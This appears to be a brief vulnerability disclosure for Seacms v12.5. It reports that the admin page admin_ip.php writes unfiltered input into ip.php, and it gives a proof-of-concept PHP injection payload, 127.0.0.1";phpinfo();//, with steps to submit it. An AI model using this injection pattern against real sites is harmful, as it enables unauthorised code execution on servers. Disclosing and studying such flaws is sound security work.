# Seacms v12.5(2021.01.02) version code execution




    Download address on official website: https://www.seacms.net
    Through code audit, the vulnerability points are /kfcst7/admin_ip.php
    Note: after the program is installed, the background directory will be renamed randomly. Here it is changed to kfcst7

![image](https://github.com/yuebinge/cve/blob/main/img/41.png)

admin_ ip.php Write the input directly to the ip.php , without filtering, resulting in arbitrary code execution:

![image](https://github.com/yuebinge/cve/blob/main/img/42.png)
###payload:
```php
127.0.0.1";phpinfo();//
```
Enter in the input box      127.0.0.1";phpinfo();//
![image](https://github.com/yuebinge/cve/blob/main/img/43.png)

Confirm, submit

![image](https://github.com/yuebinge/cve/blob/main/img/44.png)

Again, the statement phpinfo() is executed

![image](https://github.com/yuebinge/cve/blob/main/img/45.png)
So there is a code execution vulnerability.
